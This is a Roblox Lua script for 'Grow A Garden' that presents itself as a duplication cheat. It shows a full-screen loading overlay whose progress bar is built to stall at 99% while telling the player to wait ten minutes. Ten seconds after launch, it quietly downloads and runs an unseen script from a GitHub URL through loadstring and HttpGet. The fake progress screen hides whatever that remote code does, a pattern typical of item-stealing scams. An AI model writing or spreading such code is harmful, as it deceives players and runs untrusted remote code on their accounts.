local TweenService = game:GetService("TweenService")

-- UI Setup
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
Frame.BackgroundTransparency = 1

-- Title (Above Bar)
local Title = Instance.new("TextLabel", Frame)
Title.Text = "Loading - Grow A Garden 🌴"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0.4, -100)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.SourceSansBold

-- Progress Bar Background (Center)
local BarBackground = Instance.new("Frame", Frame)
BarBackground.Size = UDim2.new(0.6, 0, 0, 30)
BarBackground.Position = UDim2.new(0.2, 0, 0.5, -15)
BarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
BarBackground.BorderSizePixel = 0
BarBackground.ClipsDescendants = true

-- Progress Fill
local ProgressBar = Instance.new("Frame", BarBackground)
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
ProgressBar.BorderSizePixel = 0

-- Percent Text (Centered in Bar)
local PercentText = Instance.new("TextLabel", BarBackground)
PercentText.Text = "0%"
PercentText.Size = UDim2.new(1, 0, 1, 0)
PercentText.BackgroundTransparency = 1
PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.SourceSansBold

-- Bottom Message
local Message = Instance.new("TextLabel", Frame)
Message.Text = "Wait 10 Minutes To Prepare Your Script!"
Message.Size = UDim2.new(1, 0, 0, 50)
Message.Position = UDim2.new(0, 0, 0.5, 30)
Message.BackgroundTransparency = 1
Message.TextColor3 = Color3.fromRGB(255, 255, 255)
Message.TextScaled = true
Message.Font = Enum.Font.SourceSansBold

-- Fade-In Animation
for i = 1, 20 do
	wait(0.05)
	Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.05
end

-- Bounce Animation for Title
task.spawn(function()
	while true do
		local tweenUp = TweenService:Create(Title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = Title.Position + UDim2.new(0,0,-0.02,0)})
		local tweenDown = TweenService:Create(Title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Position = Title.Position})
		tweenUp:Play()
		tweenUp.Completed:Wait()
		tweenDown:Play()
		tweenDown.Completed:Wait()
	end
end)

-- Glow Animation for Title
task.spawn(function()
	while true do
		for brightness = 1, 5 do
			Title.TextColor3 = Color3.fromRGB(200 + brightness*10, 255, 200 + brightness*10)
			wait(0.05)
		end
		for brightness = 5, 1, -1 do
			Title.TextColor3 = Color3.fromRGB(200 + brightness*10, 255, 200 + brightness*10)
			wait(0.05)
		end
	end
end)

-- Progress Animation (3 mins to 80%, 7 mins to 99%, stuck at 99%)
local totalTime = 600
local percent = 0
local elapsed = 0

task.spawn(function()
	while percent < 99 do
		wait(0.5)
		elapsed = elapsed + 0.5
		if elapsed <= 180 then
			percent = math.floor((elapsed / 180) * 80)
		else
			percent = 80 + math.floor(((elapsed - 180) / 420) * 19)
		end
		percent = math.clamp(percent, 0, 99)
		ProgressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
		PercentText.Text = percent .. "%"
	end
end)

-- 🔔 Run DupeScriptGAG after 10-second delay
task.delay(10, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenDupe/Dupe-Pet-Seed-Egg/refs/heads/main/DupeScriptGAG"))()
end)
